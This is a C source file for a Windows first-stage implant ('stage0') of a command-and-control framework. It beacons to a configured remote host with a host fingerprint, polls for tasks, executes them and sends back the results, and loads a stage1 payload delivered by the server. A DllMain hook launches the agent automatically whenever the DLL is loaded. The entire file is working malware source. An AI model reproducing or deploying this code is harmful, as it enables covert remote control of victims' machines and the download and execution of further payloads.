#include "stage0.h"
#include "generated_config.h"
#ifdef STAGE0_DEBUG
#include <stdio.h>
#endif

#ifndef STAGE0_TRANSPORT
#define STAGE0_TRANSPORT S0_T_HTTP
#endif

static s0_config g_config = {
    (s0_transport_kind)STAGE0_STAMP_TRANSPORT, STAGE0_STAMP_PORT,
    STAGE0_STAMP_SLEEP, STAGE0_STAMP_JITTER, STAGE0_STAMP_SECURE, 0,
    STAGE0_STAMP_HOST, STAGE0_STAMP_PATH,
    STAGE0_STAMP_PAYLOAD_ID, STAGE0_STAMP_KEY
};

static DWORD WINAPI s0_thread(LPVOID context) {
    s0_agent_run((const s0_config *)context);
    return 0;
}

int s0_agent_run(const s0_config *cfg) {
    s0_transport t = {0}; s0_buffer tx = {0}, rx = {0}, result = {0};
    s0_frame_header h; const uint8_t *payload; uint64_t fp;
    uint8_t checkin[24] = {0};
    s0_debug(L"starting");
    if (!cfg) { s0_debug(L"missing configuration"); return 0; }
#ifdef STAGE0_DEBUG
    fwprintf(stderr, L"[stage0] transport=%u host=%ls port=%u path=%ls secure=%u\n",
             (unsigned)cfg->kind, cfg->host, (unsigned)cfg->port,
             cfg->path, (unsigned)cfg->secure);
#endif
    if (!s0_transport_init(&t, cfg->kind)) {
        s0_debug(L"unsupported transport"); return 0;
    }
    if (!t.open(&t, cfg)) {
        s0_debug_error(L"transport open failed", GetLastError()); return 0;
    }
    s0_debug(L"transport open");
    fp = s0_host_fingerprint();
    CopyMemory(checkin, &fp, sizeof(fp));
    CopyMemory(checkin + 8, cfg->payload_id, 16);
    if (s0_frame_pack(S0_MSG_CHECKIN, 0, 0, checkin, sizeof(checkin), &tx)) {
        s0_debug(L"sending checkin");
        if (!t.exchange(&t, tx.data, tx.length, &rx))
            s0_debug_error(L"checkin exchange failed", GetLastError());
        else
            s0_debug(L"checkin response received");
    }
    for (;;) {
        if (rx.length && s0_frame_unpack(rx.data, rx.length, &h, &payload)) {
            if (h.kind == S0_MSG_STAGE1) {
                s0_handoff_stage1(payload, h.length, cfg); break;
            }
            if (h.kind == S0_MSG_TASK && h.length && payload[0] == S0_TASK_EXIT) break;
            if (h.kind == S0_MSG_TASK &&
                s0_dispatch_task(payload, h.length, &result) &&
                s0_frame_pack(S0_MSG_RESULT, 0, h.stream_id,
                              result.data, result.length, &tx)) {
                rx.length = result.length = 0;
                t.exchange(&t, tx.data, tx.length, &rx);
                continue;
            }
        }
        rx.length = 0;
        Sleep(cfg->sleep_ms ? cfg->sleep_ms : 1000);
        if (!s0_frame_pack(S0_MSG_CHECKIN, 1, 0, checkin, sizeof(checkin), &tx)) {
            s0_debug(L"poll frame failed"); break;
        }
        if (!t.exchange(&t, tx.data, tx.length, &rx)) {
            s0_debug_error(L"poll exchange failed", GetLastError()); break;
        }
    }
    t.close(&t); s0_buffer_free(&tx); s0_buffer_free(&rx);
    s0_buffer_free(&result); return 1;
}

__declspec(dllexport) DWORD WINAPI stage0_start(void *config) {
    return (DWORD)s0_agent_run(config ? (const s0_config *)config : &g_config);
}

int main(void) {
    g_config.secure = g_config.kind == S0_T_HTTPS;
    if (g_config.secure && g_config.port == 80) g_config.port = 443;
    return s0_agent_run(&g_config) ? 0 : 1;
}

#ifdef STAGE0_BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
    (void)instance; (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(instance);
        CreateThread(0, 0, s0_thread, &g_config, 0, 0);
    }
    return TRUE;
}
#endif
